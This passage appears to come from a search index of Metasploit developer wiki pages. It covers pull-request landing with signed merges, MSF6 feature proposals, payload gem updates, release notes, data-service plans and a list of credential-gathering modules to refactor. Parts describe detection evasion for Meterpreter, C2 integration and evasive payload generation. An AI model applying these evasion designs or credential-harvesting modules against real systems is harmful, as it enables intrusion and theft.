to branch pull requests . If Alice knows a solution to Bob's pull request that Juan pointed out, it is easy for Alice to provide that solution by following the procedure above. git blame will still work correctly, commit histories will all be accurate, everyone on the pull request will be notified of Alice's changes, and Juan doesn't have to wait around for Bob to figure out how to use send_request_cgi() or whatever the problem was. The hardest part is remembering how to construct the pull request to Bob -- lucky for you, this .git/config alias makes that part pretty push-button.","title":"Collaboration between contributors"},{"location":"dev/dark/Landing-Pull-Requests/#landing-to-upstream","text":"Back to PR #1217. Turns out, my change was enough to land the original chunk of work. So, someone else (@jlee-r7) was able to to do something like this: $ git fetch upstream remote: Counting objects: 12, done. remote: Compressing objects: 100% (2/2), done. remote: Total 7 (delta 5), reused 7 (delta 5) Unpacking objects: 100% (7/7), done. From https://github.com/rapid7/metasploit-framework 9e499e5..263e967 refs/pull/1651/head -> upstream/pr/1651 This all looked good, so he could land this to Rapid7's repo with: $ git checkout -b upstream-master --track upstream/master $ git merge -S --no-ff --edit landing-1217 $ git push upstream upstream-master:master Or, if he already have upstream-master checked out: $ git checkout upstream-master $ git rebase upstream/master $ git merge -S --no-ff --edit landing-1217 $ git push upstream upstream-master:master The --edit is optional if we have our editor configured correctly in $HOME/.gitconfig . The point here is that we always want a merge commit, and we never want to use the (often useless) default merge commit message. For #1217, this was changed to: Land #1217, java payload build system refactor Note that you should rebase before landing -- otherwise, your merge commit will be lost in the rebase. Finally, the -S indicates we are going to sign the merge, using our GPG key. This is a nice way to prove in a secure way that this merge is, in fact, coming from you, and not someone impersonating you. For more on signing merges, see A Git Horror Story: Repository Integrity With Signed Commits . To set yourself up for signing, your .gitconfig (or metasploit-framework/git/.config) file should have these entries: [user] name = Your Name email = your@email.xxx signingkey = DEADBEEF # Must match exactly with your key for \"Your Name <your@email.xxx>\" [alias] c = commit -S --edit m = merge -S --no-ff --edit People with commit rights to rapid7/metasploit-framework will have their keys listed here .","title":"Landing to upstream"},{"location":"dev/dark/Landing-Pull-Requests/#cross-linking-prs-bugs-and-commits","text":"TODO: Update in this new post-Redmine, GitHub issues world","title":"Cross-linking PRs, Bugs, and Commits"},{"location":"dev/dark/Landing-Pull-Requests/#merge-conflicts","text":"The nice thing about this strategy is that you can test for merge conflicts straight away. You'd use a sequence like: git checkout upstream/pr/1234 git checkout -b landing-1234 git checkout master git checkout -b master-temp git merge landing-1234 master-temp If that works, great, you know you don't have any merge conflicts right now.","title":"Merge conflicts"},{"location":"dev/dark/Landing-Pull-Requests/#questions-and-corrections","text":"Bug @todb-r7, either on Freenode on the #metasploit channel (he's todb there), or by e-mailing the metasploit-hackers mailing list.","title":"Questions and Corrections"},{"location":"dev/dark/MSF6-Feature-Proposals/","text":"List of potential major features (things that would make major breaking changes) for MSF6: Payloads and Post-exploitation Meterpreter Transport and Scalability Overhaul The Meterpreter Protocol \"TLV\" is enhanced to support modern features such as logging, unidirectional messages, obfuscation, sequence number reassembly and more. This feature will enable Meterpreter sessions to be more robust, faster, and evade detection with greater ease than before. Additionally, Meterpreter payload listeners, rather than being integrated straight into msfconsole , will run as an independent process that communicates with msfconsole (1 or more users) over RPC similar to the msfdb_ws (Metasploit Database Web Service). The external listener then replaces the 'metasploit-aggregator' project by not requiring an intermediate proxy to park or share sessions, these are done directly by having the listeners independent of console users. Listener capabilities be embeddable directly into Meterpreter payloads, allowing local listeners and remote listeners internal to other networks could be implemented the same way, enabling greater scalability and facilitating pivoting across more complex networks, allowing better post-exploitation possibilities in modern network environments. Integration with external C2 frameworks If listeners are externalized, then there is an API layer both for interactive interaction with remote sessions, and a way for the Post-exploitation API to communicate with the external sessions. That should mean that if an external C2 framework supports at minimum shell interaction, a bulk of the Post-exploitation API should be applicable against external C2 frameworks as well. Metasploit would then be able to integrate both with other open-source C2 frameworks, as well as private ones. Integration of native tool-chains Tools like Veil, pwnlib, etc. have for a long time used native compilers and tooling to build payloads and evasions. Metasploit has opted mostly for native Ruby solutions, though it does have some implicit runtime dependencies like apktool for Android payload injection. However, these tools are getting harder to maintain and use (e.g. metasm has a diffcult time building any non-trivial C code, we just spent a month fixing a bug it had with Ruby 2.5 and Windows). It would be nice to have either be able to depend on a set of first-class toolchains being available in the environment, or have some way to package them natively with Metasploit itself. A full suite of compilers and tools does consume considerable amounts of space (e.g. mettle's toolchain is 1.8GB uncompressed), but this is probably less of a problem than it was 15 years ago. Native first-class UUID-aware, async stager payload Make a new async payload type (based on pingback payload work) making secure comms, endpoint verification, and async communication first-class citizens, and on by default. These session types would support a much more limited set of actions than Meterpreter, only supporting sleep/upload/download/stage, but would be upgraded to Meterpreter directly as-needed (maybe even transparently). Network protocols can be much more exotic for this, and the listener/payload should be usable externally from Metasploit as well. Todo: pull in async payload proposal notes from @bwatters-r7. Module Interface Overhaul network targeting Setting at least 5 variables RHOSTS/RPORT/SSL/VHOST/SSL_Version/User/Pass/etc... to target a single web application is very cumbersome. When these variables also do not apply to multiple RHOSTS exactly, the scheme of multiple variables falls apart futher. Metasploit should be able to target URLs directly, that can all have their own independent ports, users, hostnames, etc: set TARGETS https://user:password@target_app:4343 https://target_app2 Overhaul credential targeting The credential datastore options also has many different co-dependent and independent variables, which are confusing and awkward to use. In addition, there is little in the way of user-parallelism for using login scanners against single-service web apps. MSF6 should have an easier less messy overhaul of targeting multiple users and apps as well. Maybe TARGETS could be used the same way? Collapse module types, expose module 'abilities' or 'methods' instead Modules in Metasploit are classified according to what they can do ('exploits can exploit, scanners can scan') but often its useful to be able to scan for exploitable targets. Workarounds include reaching between modules and sharing library code and mixins. This proposal suggests that 'exploit' and 'scanner', as well as many other aux-type modules should collapse into a single module type. They simply expose capabilities like 'scan', 'check', 'exploit', etc. and a single module can do all of these. Additionally, 'admin' modules could be collapsed. For instance, why have a chromecast_reset and chromecast_youtube module when you can use 'admin/chromecast' and just type 'cast' or 'reset' as methods on this single module. This would also replace the 'ACTIONS' datastore option where they are used in multi-action aux modules. Integration with external exploitation frameworks E.g. could we just use routersploit or wpsploit directly from within framework and gather loot/run post exploitation, etc. through them? Maybe using the external module RPC, just being able to expose multiple modules behind the same API? Changing module structure on disk Currently a non-trivial exploit module will require adding code to 4 different subdirectories (lib, modules, documentation, external) which makes it both hard to follow all of the moving pieces, but also makes it harder to extract modules for independent use. See https://github.com/rapid7/metasploit-framework/wiki/Bundled-Modules-Proposal for a more detailed proposal. Data Model Temporal / log-oriented data model Metasploit implements a standard Ruby-on-Rails CRUD model for storing data about an environment. A Host object is created, updated, deleted, etc. But, anything can update anything, making it easy to lose data, and hard to notice changes over time. A workaround is religious use of workspaces to segregate observations, but that's more of a workaround. A log-structured data model (observations about hosts/loot/credentials/services, etc.) should just be objects that are imported into a datastore that prioritizes search over everything else. As a concrete example, say every report_* method just wrote a JSON blob into elasticsearch. Then you would have first observed data, and when something else happens, say a password is cracked, rather than modifying a credential object, there would just be an enrichment object added to the data store, and both could be matched together later. The current data model also often doesn't have ways of storing arbitrary information from modules that need it; loot is often used as a workaround, but it's not searchable by content. Providing a way to store arbitrary JSON from modules would allow the flexibility to store anything, search for anything, and to never lose anything. Also, services would be removable as well from the database when a service is down. Note: a temporal data model will likely need something better able to show data relations than the current tabular rex-table approach in msfconsole. Web UI? Data model is always available The database in Metasploit has historically been optional. Not everyone needs to store data and setting up and maintaining the database is often a burden to the user, with many possible failure modes. Having the data model not always be available often complicates Metasploit's code, and made some features like UUID tracking for payloads difficult to implement reliably. Metasploit 5 added web services for the data mode, which further complicated the code paths, adding a third way for behavior to possibly differ. We should make a light-weight in-memory database service that can run automatically if a persistent database is unavailable or unconfigured, which can always provide some sort of database service to Metasploit, even if it is ephemeral and exits when msfconsole/listeners, etc. have exited. framework.db should always exist, even if the data it stores goes into a temporary bit bucket. Then all of the conditional code paths can go away. Infrastructure First class user-oriented documentation Provide a means for the community to document changes to how Metasploit works (developer and user), unify various documentation resources. Make Metasploit Higher-performance / lighter weight As subcomponents get carved off (external database service, external listeners), they should be implemented in a lighter weight way. We have some prototypes of the database web service rewritten in golang, and a persistent payload generation service that can be used my a client-only msfvenom -like tool can speed up execution considerably. Sunsetting, separation of old module / code Metasploit has some really old modules that probably don't get used very often. Can we segregate these or sunset them so that the overall number of modules is reduced? Integration of separate Metasploit projects into fewer repos (rex / payloads / metasploit data models) Metasploit is spread out across over a dozen different repos. Let's merge them as much as we can to make it easier to change them across the board (e.g. when changing the data model) and to make it easier to have parallel branches for stable/unstable work.","title":"MSF6 Feature Proposals"},{"location":"dev/dark/MSF6-Feature-Proposals/#payloads-and-post-exploitation","text":"","title":"Payloads and Post-exploitation"},{"location":"dev/dark/MSF6-Feature-Proposals/#meterpreter-transport-and-scalability-overhaul","text":"The Meterpreter Protocol \"TLV\" is enhanced to support modern features such as logging, unidirectional messages, obfuscation, sequence number reassembly and more. This feature will enable Meterpreter sessions to be more robust, faster, and evade detection with greater ease than before. Additionally, Meterpreter payload listeners, rather than being integrated straight into msfconsole , will run as an independent process that communicates with msfconsole (1 or more users) over RPC similar to the msfdb_ws (Metasploit Database Web Service). The external listener then replaces the 'metasploit-aggregator' project by not requiring an intermediate proxy to park or share sessions, these are done directly by having the listeners independent of console users. Listener capabilities be embeddable directly into Meterpreter payloads, allowing local listeners and remote listeners internal to other networks could be implemented the same way, enabling greater scalability and facilitating pivoting across more complex networks, allowing better post-exploitation possibilities in modern network environments.","title":"Meterpreter Transport and Scalability Overhaul"},{"location":"dev/dark/MSF6-Feature-Proposals/#integration-with-external-c2-frameworks","text":"If listeners are externalized, then there is an API layer both for interactive interaction with remote sessions, and a way for the Post-exploitation API to communicate with the external sessions. That should mean that if an external C2 framework supports at minimum shell interaction, a bulk of the Post-exploitation API should be applicable against external C2 frameworks as well. Metasploit would then be able to integrate both with other open-source C2 frameworks, as well as private ones.","title":"Integration with external C2 frameworks"},{"location":"dev/dark/MSF6-Feature-Proposals/#integration-of-native-tool-chains","text":"Tools like Veil, pwnlib, etc. have for a long time used native compilers and tooling to build payloads and evasions. Metasploit has opted mostly for native Ruby solutions, though it does have some implicit runtime dependencies like apktool for Android payload injection. However, these tools are getting harder to maintain and use (e.g. metasm has a diffcult time building any non-trivial C code, we just spent a month fixing a bug it had with Ruby 2.5 and Windows). It would be nice to have either be able to depend on a set of first-class toolchains being available in the environment, or have some way to package them natively with Metasploit itself. A full suite of compilers and tools does consume considerable amounts of space (e.g. mettle's toolchain is 1.8GB uncompressed), but this is probably less of a problem than it was 15 years ago.","title":"Integration of native tool-chains"},{"location":"dev/dark/MSF6-Feature-Proposals/#native-first-class-uuid-aware-async-stager-payload","text":"Make a new async payload type (based on pingback payload work) making secure comms, endpoint verification, and async communication first-class citizens, and on by default. These session types would support a much more limited set of actions than Meterpreter, only supporting sleep/upload/download/stage, but would be upgraded to Meterpreter directly as-needed (maybe even transparently). Network protocols can be much more exotic for this, and the listener/payload should be usable externally from Metasploit as well. Todo: pull in async payload proposal notes from @bwatters-r7.","title":"Native first-class UUID-aware, async stager payload"},{"location":"dev/dark/MSF6-Feature-Proposals/#module-interface","text":"","title":"Module Interface"},{"location":"dev/dark/MSF6-Feature-Proposals/#overhaul-network-targeting","text":"Setting at least 5 variables RHOSTS/RPORT/SSL/VHOST/SSL_Version/User/Pass/etc... to target a single web application is very cumbersome. When these variables also do not apply to multiple RHOSTS exactly, the scheme of multiple variables falls apart futher. Metasploit should be able to target URLs directly, that can all have their own independent ports, users, hostnames, etc: set TARGETS https://user:password@target_app:4343 https://target_app2","title":"Overhaul network targeting"},{"location":"dev/dark/MSF6-Feature-Proposals/#overhaul-credential-targeting","text":"The credential datastore options also has many different co-dependent and independent variables, which are confusing and awkward to use. In addition, there is little in the way of user-parallelism for using login scanners against single-service web apps. MSF6 should have an easier less messy overhaul of targeting multiple users and apps as well. Maybe TARGETS could be used the same way?","title":"Overhaul credential targeting"},{"location":"dev/dark/MSF6-Feature-Proposals/#collapse-module-types-expose-module-abilities-or-methods-instead","text":"Modules in Metasploit are classified according to what they can do ('exploits can exploit, scanners can scan') but often its useful to be able to scan for exploitable targets. Workarounds include reaching between modules and sharing library code and mixins. This proposal suggests that 'exploit' and 'scanner', as well as many other aux-type modules should collapse into a single module type. They simply expose capabilities like 'scan', 'check', 'exploit', etc. and a single module can do all of these. Additionally, 'admin' modules could be collapsed. For instance, why have a chromecast_reset and chromecast_youtube module when you can use 'admin/chromecast' and just type 'cast' or 'reset' as methods on this single module. This would also replace the 'ACTIONS' datastore option where they are used in multi-action aux modules.","title":"Collapse module types, expose module 'abilities' or 'methods' instead"},{"location":"dev/dark/MSF6-Feature-Proposals/#integration-with-external-exploitation-frameworks","text":"E.g. could we just use routersploit or wpsploit directly from within framework and gather loot/run post exploitation, etc. through them? Maybe using the external module RPC, just being able to expose multiple modules behind the same API?","title":"Integration with external exploitation frameworks"},{"location":"dev/dark/MSF6-Feature-Proposals/#changing-module-structure-on-disk","text":"Currently a non-trivial exploit module will require adding code to 4 different subdirectories (lib, modules, documentation, external) which makes it both hard to follow all of the moving pieces, but also makes it harder to extract modules for independent use. See https://github.com/rapid7/metasploit-framework/wiki/Bundled-Modules-Proposal for a more detailed proposal.","title":"Changing module structure on disk"},{"location":"dev/dark/MSF6-Feature-Proposals/#data-model","text":"","title":"Data Model"},{"location":"dev/dark/MSF6-Feature-Proposals/#temporal-log-oriented-data-model","text":"Metasploit implements a standard Ruby-on-Rails CRUD model for storing data about an environment. A Host object is created, updated, deleted, etc. But, anything can update anything, making it easy to lose data, and hard to notice changes over time. A workaround is religious use of workspaces to segregate observations, but that's more of a workaround. A log-structured data model (observations about hosts/loot/credentials/services, etc.) should just be objects that are imported into a datastore that prioritizes search over everything else. As a concrete example, say every report_* method just wrote a JSON blob into elasticsearch. Then you would have first observed data, and when something else happens, say a password is cracked, rather than modifying a credential object, there would just be an enrichment object added to the data store, and both could be matched together later. The current data model also often doesn't have ways of storing arbitrary information from modules that need it; loot is often used as a workaround, but it's not searchable by content. Providing a way to store arbitrary JSON from modules would allow the flexibility to store anything, search for anything, and to never lose anything. Also, services would be removable as well from the database when a service is down. Note: a temporal data model will likely need something better able to show data relations than the current tabular rex-table approach in msfconsole. Web UI?","title":"Temporal / log-oriented data model"},{"location":"dev/dark/MSF6-Feature-Proposals/#data-model-is-always-available","text":"The database in Metasploit has historically been optional. Not everyone needs to store data and setting up and maintaining the database is often a burden to the user, with many possible failure modes. Having the data model not always be available often complicates Metasploit's code, and made some features like UUID tracking for payloads difficult to implement reliably. Metasploit 5 added web services for the data mode, which further complicated the code paths, adding a third way for behavior to possibly differ. We should make a light-weight in-memory database service that can run automatically if a persistent database is unavailable or unconfigured, which can always provide some sort of database service to Metasploit, even if it is ephemeral and exits when msfconsole/listeners, etc. have exited. framework.db should always exist, even if the data it stores goes into a temporary bit bucket. Then all of the conditional code paths can go away.","title":"Data model is always available"},{"location":"dev/dark/MSF6-Feature-Proposals/#infrastructure","text":"","title":"Infrastructure"},{"location":"dev/dark/MSF6-Feature-Proposals/#first-class-user-oriented-documentation","text":"Provide a means for the community to document changes to how Metasploit works (developer and user), unify various documentation resources.","title":"First class user-oriented documentation"},{"location":"dev/dark/MSF6-Feature-Proposals/#make-metasploit-higher-performance-lighter-weight","text":"As subcomponents get carved off (external database service, external listeners), they should be implemented in a lighter weight way. We have some prototypes of the database web service rewritten in golang, and a persistent payload generation service that can be used my a client-only msfvenom -like tool can speed up execution considerably.","title":"Make Metasploit Higher-performance / lighter weight"},{"location":"dev/dark/MSF6-Feature-Proposals/#sunsetting-separation-of-old-module-code","text":"Metasploit has some really old modules that probably don't get used very often. Can we segregate these or sunset them so that the overall number of modules is reduced?","title":"Sunsetting, separation of old module / code"},{"location":"dev/dark/MSF6-Feature-Proposals/#integration-of-separate-metasploit-projects-into-fewer-repos-rex-payloads-metasploit-data-models","text":"Metasploit is spread out across over a dozen different repos. Let's merge them as much as we can to make it easier to change them across the board (e.g. when changing the data model) and to make it easier to have parallel branches for stable/unstable work.","title":"Integration of separate Metasploit projects into fewer repos (rex / payloads / metasploit data models)"},{"location":"dev/dark/Merging-Metasploit-Payload-Gem-Updates/","text":"When the Metasploit Payloads has a new merge appear in master , a new Ruby gem is built and automatically pushed up to RubyGems . This new version needs to be merged into the Metasploit Framework repository for those changes to be included. To do this, committers must: Create a new branch in the Metasploit Framework repository. Name it something useful like metasploit-payloads-<version> . Modify metasploit-framework.gemspec , so that the new version number is specified for the metasploit-payloads gem. Run bundle install . Remove any test/development binaries from data/meterpreter . Run tools/modules/update_payload_cached_sizes.rb . Make sure that Gemfile.lock only contains changes that are related to Metasploit Payloads. Stage the following for commit in git : Gemfile.lock metasploit-framework.gemspec Any payload modules that have had an updated payload size (usually this includes stageless payloads only) Commit the staged files. Push the branch to github. Create the Pull Request. Done! A sample update PR/commit can be found here: https://github.com/rapid7/metasploit-framework/pull/7666/files","title":"Merging Metasploit Payload Gem Updates"},{"location":"dev/dark/Metasploit-5.0-Release-Notes/","text":"Metasploit Framework 5.0 has released! Metasploit 5.0 brings many new features, including new database and automation APIs, evasion modules and libraries, language support, improved performance, and ease-of-use. See the release announcement here . The following is a high-level overview of Metasploit 5.0\u2019s features and capabilities. Metasploit users can now run the PostgreSQL database by itself as a RESTful service, which allows for multiple Metasploit consoles and external tools to interact with it. Parallel processing of the database and regular msfconsole operations improves performance by offloading some bulk operations to the database service. A JSON-RPC API enables users to integrate Metasploit with additional tools and languages. This release adds a common web service framework to expose both the database and the automation APIs; this framework supports advanced authentication and concurrent operations. Read more about how to set up and run these new services here . Adds evasion module type and libraries to let users generate evasive payloads without having to install external tools. Read the research underpinning evasion modules here . Rapid7\u2019s first evasion modules are here . The metashell feature allows users to run background sessions and interact with shell sessions without needing to upgrade to a Meterpreter session. External modules add Metasploit support for Python and Go in addition to Ruby. Any module can target multiple hosts by setting RHOSTS to a range of IPs, or by referencing a hosts file with the file:// option. Metasploit now treats RHOST and RHOSTS as identical options. An updated search mechanism improves Framework start time and removes database dependency. Get Metasploit 5.0 You can get Metasploit 5.0 by checking out the 5.0.0 tag in the Metasploit GitHub project. Need a primer on Framework architecture and usage? Take a look at our wiki here , and feel free to reach out to the broader community on Slack . There are also myriad public and user-generated resources on Metasploit tips, tricks, and content, so if you can\u2019t find something you want in our wiki, ask Google or the community what they recommend. See all the ways to stay informed and get involved at https://metasploit.com .","title":"Metasploit 5.0 Release Notes"},{"location":"dev/dark/Metasploit-5.0-Release-Notes/#get-metasploit-50","text":"You can get Metasploit 5.0 by checking out the 5.0.0 tag in the Metasploit GitHub project. Need a primer on Framework architecture and usage? Take a look at our wiki here , and feel free to reach out to the broader community on Slack . There are also myriad public and user-generated resources on Metasploit tips, tricks, and content, so if you can\u2019t find something you want in our wiki, ask Google or the community what they recommend. See all the ways to stay informed and get involved at https://metasploit.com .","title":"Get Metasploit 5.0"},{"location":"dev/dark/Metasploit-Data-Service-Enhancements-(Goliath)/","text":"Project Goliath came about primarilly around the need to enhance the current data service and data models to increase the value of data in metasploit to our end users. This work is currently being done in 2 stages: Stage 1 This is currently a work in progress (which is why Goliath is currently not fully functional). The work being done or already done include: * Port of the current data models to be used over HTTP / HTTPS * Creation of a web service that serves the metasploit data model * Creation of a new command in metasploit to remote (web based) data services * Creation of a Metasploit Data Service API V1 document Stage 2 * Enhance the current data model * Creation of a Metasploit Data Service API V2 document Potential Changes include (feel free to submit ideas): * Creation of a generic data type (for when you can't figure out which data type data belongs) Rationale The current data storage mechanism couples the metasploit core framework code to the current data storage technology. Coupling causes inflexibility which are reflected via the following problems: * Changes to the current data model are complex * The ability to support/use different data storage technologies is difficult * Promotes a monolithic architecture where poor performance in any segment of the software affects the entire system (large network scans) Our solution to this is a data service proxy. A data service proxy allows us to separate core metasploit framework code from the underlying data service technology. The framework.db reference to data services is no longer tied directly to the underlying data storage, but instead all calls are proxied to an underlying implementation. Currently we plan to support the legacy data storage technology stack (RAILS/PostgreSQL) which we hope to eventually phase out. The new implementation will use a RESTful ( https://en.wikipedia.org/wiki/Representational_state_transfer ) approach whereby calls to framework.db can be proxied to a remote web service that supports the same data service API. We have built a web service that runs atop the current data storage service for the community. This approach enables us to: * More easily enhance the metasploit data model * Run a web-based data service independent of the metasploit framework * Reduces the memory used by a metasploit framework instance using a data service by no longer requiring a DB client * Increases throughput as storage calls don't necessarily need to be asynchronous * Allow teams to collaborate easily by connecting to a centralized data service * Quickly build out data services that leverage different technology stacks * Isolate component testing * Users of metasploit can now leverage a rigid API to build other tools easily (documentation to be provided soon) Usage For more information on setting up the web service and using the data services see Metasploit Web Service .","title":"Metasploit Data Service Enhancements (Goliath)"},{"location":"dev/dark/Metasploit-Data-Service-Enhancements-(Goliath)/#rationale","text":"The current data storage mechanism couples the metasploit core framework code to the current data storage technology. Coupling causes inflexibility which are reflected via the following problems: * Changes to the current data model are complex * The ability to support/use different data storage technologies is difficult * Promotes a monolithic architecture where poor performance in any segment of the software affects the entire system (large network scans) Our solution to this is a data service proxy. A data service proxy allows us to separate core metasploit framework code from the underlying data service technology. The framework.db reference to data services is no longer tied directly to the underlying data storage, but instead all calls are proxied to an underlying implementation. Currently we plan to support the legacy data storage technology stack (RAILS/PostgreSQL) which we hope to eventually phase out. The new implementation will use a RESTful ( https://en.wikipedia.org/wiki/Representational_state_transfer ) approach whereby calls to framework.db can be proxied to a remote web service that supports the same data service API. We have built a web service that runs atop the current data storage service for the community. This approach enables us to: * More easily enhance the metasploit data model * Run a web-based data service independent of the metasploit framework * Reduces the memory used by a metasploit framework instance using a data service by no longer requiring a DB client * Increases throughput as storage calls don't necessarily need to be asynchronous * Allow teams to collaborate easily by connecting to a centralized data service * Quickly build out data services that leverage different technology stacks * Isolate component testing * Users of metasploit can now leverage a rigid API to build other tools easily (documentation to be provided soon)","title":"Rationale"},{"location":"dev/dark/Metasploit-Data-Service-Enhancements-(Goliath)/#usage","text":"For more information on setting up the web service and using the data services see Metasploit Web Service .","title":"Usage"},{"location":"dev/dark/Metasploit-Framework-Wish-List/","text":"We are frequently asked what would be useful as a contribution to the project. There's evergreen advice below, as well as a few more specific wish list ideas from our team. Always useful: If you're unfamiliar with Metasploit or looking to tackle some smaller projects, we'll thank you a million times over to look at our issue queue . Submitting bug fixes, testing reported issues, and answering questions are all extremely helpful. See an issue whose submitter didn't give us much information about replication, their target environment, or their version of Metasploit? See if you can get some clarity to help out, or better yet, test it yourself! You can also sort out feature requests in our issue queue . See something that sounds cool? Fantastic! Tinker away and submit a PR. Write docs! Adding documentation is one of the best ways to help current and future users (especially beginners) and save developers pain. Check out PRs in the attic and see if you can pick up where another contributor left off or got stuck. **A few other ideas: ** Implement transport switching for Mettle. Improve network evasions across multiple protocols. Client headers abound with telltales! Add UPnP recon and fuzzing library support (there's a fun thread on this idea here )","title":"Metasploit Framework Wish List"},{"location":"dev/dark/Metasploit-Hackathons/","text":"2016 We hosted the first general Metasploit hackathon at the Rapid7 Austin Office Thursday 2016-09-15, starting at Noon (12pm) CST and going until 10am CST the following day. Got a cool Meterpreter extension you have wanted to try, module to write, or feature to add? We'll be working both on new things and shepherding old-but-awesome things. Come join us on #metasploit on Freenode as well. 2017 We hosted the second general Metasploit hackathon at the Rapid7 Austin Office and the Hyatt Place Arboretum, 2017-06-22 through 2017-06-25, including 15 developers. Combine a rotating cast of contributors, way too much food, a couple of guitars, and some incredibly outsized laptops, you end up with some great Metasploit hacking and fun.","title":"Metasploit Hackathons"},{"location":"dev/dark/Metasploit-Hackathons/#2016","text":"We hosted the first general Metasploit hackathon at the Rapid7 Austin Office Thursday 2016-09-15, starting at Noon (12pm) CST and going until 10am CST the following day. Got a cool Meterpreter extension you have wanted to try, module to write, or feature to add? We'll be working both on new things and shepherding old-but-awesome things. Come join us on #metasploit on Freenode as well.","title":"2016"},{"location":"dev/dark/Metasploit-Hackathons/#2017","text":"We hosted the second general Metasploit hackathon at the Rapid7 Austin Office and the Hyatt Place Arboretum, 2017-06-22 through 2017-06-25, including 15 developers. Combine a rotating cast of contributors, way too much food, a couple of guitars, and some incredibly outsized laptops, you end up with some great Metasploit hacking and fun.","title":"2017"},{"location":"dev/dark/Metasploit-Loginpalooza/","text":"The Loginpalooza contest is over! Congrats and thanks to @TomSellers, @ChrisTuncer, and @0a2940! The list of modules to refactor is still here. Modules that get refactored should be removed from the list entirely. If you'd like to learn how to convert your favorite existing module, or write a new module, using the new LoginScanner mixin and the Credentials gem, please take a look at [[Creating Metasploit Framework LoginScanners]]. Modules to Refactor auxiliary/gather/apache_rave_creds.rb auxiliary/scanner/http/apache_userdir_enum.rb auxiliary/voip/asterisk_login.rb post/osx/gather/autologin_password.rb auxiliary/scanner/http/axis_local_file_include.rb exploits/windows/http/ca_arcserve_rpc_authbypass.rb auxiliary/scanner/misc/cctv_dvr_login.rb auxiliary/scanner/http/cisco_asa_asdm.rb auxiliary/scanner/http/cisco_ironport_enum.rb auxiliary/scanner/couchdb/couchdb_login.rb auxiliary/gather/d20pass.rb auxiliary/scanner/http/dell_idrac.rb auxiliary/scanner/http/dlink_dir_300_615_http_login.rb auxiliary/scanner/http/dlink_dir_615h_http_login.rb auxiliary/scanner/http/dlink_dir_session_cgi_http_login.rb auxiliary/scanner/http/dolibarr_login.rb auxiliary/gather/doliwamp_traversal_creds.rb auxiliary/server/capture/drda.rb auxiliary/scanner/http/drupal_views_user_enum.rb auxiliary/scanner/misc/dvr_config_disclosure.rb auxiliary/gather/eaton_nsm_creds.rb auxiliary/scanner/http/ektron_cms400net.rb post/osx/gather/enum_osx.rb post/windows/gather/enum_snmp.rb post/windows/gather/enum_tomcat.rb post/multi/gather/filezilla_client_cred.rb exploits/multi/http/glassfish_deployer.rb auxiliary/scanner/http/glassfish_login.rb auxiliary/gather/hp_snac_domain_creds.rb auxiliary/scanner/http/infovista_enum.rb auxiliary/scanner/ipmi/ipmi_dumphashes.rb auxiliary/scanner/oracle/isqlplus_login.rb auxiliary/scanner/oracle/isqlplus_sidbrute.rb exploits/linux/http/kloxo_sqli.rb auxiliary/scanner/scada/koyo_login.rb auxiliary/scanner/telnet/lantronix_telnet_password.rb auxiliary/scanner/lotus/lotus_domino_hashes.rb auxiliary/scanner/lotus/lotus_domino_login.rb auxiliary/scanner/mongodb/mongodb_login.rb post/linux/gather/mount_cifs_creds.rb auxiliary/scanner/msf/msf_rpc_login.rb auxiliary/scanner/msf/msf_web_login.rb auxiliary/scanner/nessus/nessus_ntp_login.rb auxiliary/scanner/nessus/nessus_xmlrpc_login.rb auxiliary/scanner/nexpose/nexpose_api_login.rb auxiliary/scanner/http/novell_mdm_creds.rb auxiliary/scanner/misc/oki_scanner.rb auxiliary/scanner/http/openmind_messageos_login.rb auxiliary/scanner/openvas/openvas_gsad_login.rb auxiliary/scanner/openvas/openvas_omp_login.rb auxiliary/scanner/openvas/openvas_otp_login.rb auxiliary/scanner/http/oracle_ilom_login.rb post/windows/gather/credentials/outlook.rb auxiliary/scanner/http/owa_login.rb auxiliary/scanner/pcanywhere/pcanywhere_login.rb post/multi/gather/pgpass_creds.rb auxiliary/scanner/postgres/postgres_version.rb post/linux/gather/pptpd_chap_secrets.rb auxiliary/scanner/http/radware_appdirector_enum.rb auxiliary/scanner/misc/raysharp_dvr_passwords.rb post/windows/gather/credentials/razer_synapse.rb post/windows/gather/credentials/razorsql.rb auxiliary/scanner/rservices/rexec_login.rb auxiliary/scanner/http/rfcode_reader_enum.rb auxiliary/scanner/rservices/rlogin_login.rb auxiliary/scanner/misc/rosewill_rxs3211_passwords.rb auxiliary/scanner/rservices/rsh_login.rb auxiliary/scanner/http/sap_businessobjects_user_brute.rb auxiliary/scanner/http/sap_businessobjects_user_brute_web.rb auxiliary/scanner/http/sap_businessobjects_user_enum.rb auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb auxiliary/scanner/sap/sap_mgmt_con_brute_login.rb auxiliary/scanner/sap/sap_soap_bapi_user_create1.rb auxiliary/scanner/sap/sap_soap_rfc_brute_login.rb auxiliary/scanner/sap/sap_web_gui_brute_login.rb auxiliary/scanner/http/sentry_cdu_enum.rb auxiliary/scanner/http/sevone_enum.rb auxiliary/scanner/oracle/sid_brute.rb auxiliary/admin/oracle/sid_brute.rb auxiliary/server/capture/sip.rb post/windows/gather/credentials/smartermail.rb post/windows/gather/credentials/spark_im.rb auxiliary/scanner/http/splunk_web_login.rb auxiliary/scanner/http/squiz_matrix_user_enum.rb auxiliary/scanner/ssh/ssh_identify_pubkeys.rb auxiliary/scanner/telnet/telnet_ruggedcom.rb auxiliary/scanner/http/titan_ftp_admin_pwd.rb auxiliary/scanner/http/tomcat_enum.rb post/windows/gather/credentials/tortoisesvn.rb post/windows/gather/credentials/total_commander.rb auxiliary/scanner/http/typo3_bruteforce.rb auxiliary/gather/vbulletin_vote_sqli.rb exploits/unix/webapp/vbulletin_vote_sqli_exec.rb auxiliary/scanner/http/vcms_login.rb auxiliary/scanner/vmware/vmware_http_login.rb auxiliary/scanner/dcerpc/windows_deployment_services.rb auxiliary/scanner/http/wordpress_login_enum.rb auxiliary/gather/wp_w3_total_cache_hash_extract.rb Special attention needed [ ] post/windows/gather/enum_domain.rb - Partials, should create realms but not full cores [ ] post/windows/gather/enum_domain_group_users.rb - Should create realms and publics but won't be able to get privates [ ] post/windows/gather/enum_domains.rb - Creates realms [ ] post/windows/gather/enum_logged_on_users.rb - Creates publics but not privates","title":"Metasploit Loginpalooza"},{"location":"dev/dark/Metasploit-Loginpalooza/#modules-to-refactor","text":"auxiliary/gather/apache_rave_creds.rb auxiliary/scanner/http/apache_userdir_enum.rb auxiliary/voip/asterisk_login.rb post/osx/gather/autologin_password.rb auxiliary/scanner/http/axis_local_file_include.rb exploits/windows/http/ca_arcserve_rpc_authbypass.rb auxiliary/scanner/misc/cctv_dvr_login.rb 